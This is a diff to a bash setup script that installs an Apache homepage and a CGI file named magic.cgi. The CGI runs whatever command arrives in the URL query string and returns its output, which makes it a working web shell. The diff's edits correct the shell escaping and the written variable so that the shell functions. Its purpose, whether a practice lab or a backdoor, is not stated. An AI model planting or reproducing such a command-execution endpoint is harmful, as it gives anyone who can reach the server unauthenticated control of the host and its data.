@@ -100,7 +100,7 @@ HOME="<html><head>
 
 </body></html>"
 
-echo "$HOME" | sudo tee /var/www/index.html > /dev/null
+echo "$HOME" | sudo tee /var/www/html/index.html > /dev/null
 
 CGI="#!/bin/bash
 function urldecode() { : \"\${*//+/ }\"; echo -e \"\${_//%/\\x}\"; }
@@ -108,14 +108,14 @@ function urldecode() { : \"\${*//+/ }\"; echo -e \"\${_//%/\\x}\"; }
 echo \"Content-type: text/html\"
 echo \"\"
 
-COMM=$(echo \$QUERY_STRING | cut -d = -f 2)
-COMM=$(urldecode \$COMM)
+COMM=\$(echo \$QUERY_STRING | cut -d = -f 2)
+COMM=\$(urldecode \$COMM)
 echo \"<pre>\"
 \$COMM 2>&1
 echo \"</pre>\""
 
 sudo mkdir /var/cgi-bin
-echo "$COMM" | sudo tee /var/cgi-bin/magic.cgi > /dev/null
+echo "$CGI" | sudo tee /var/cgi-bin/magic.cgi > /dev/null
 
 echo "Enabling service..."
 sudo systemctl enable apache2
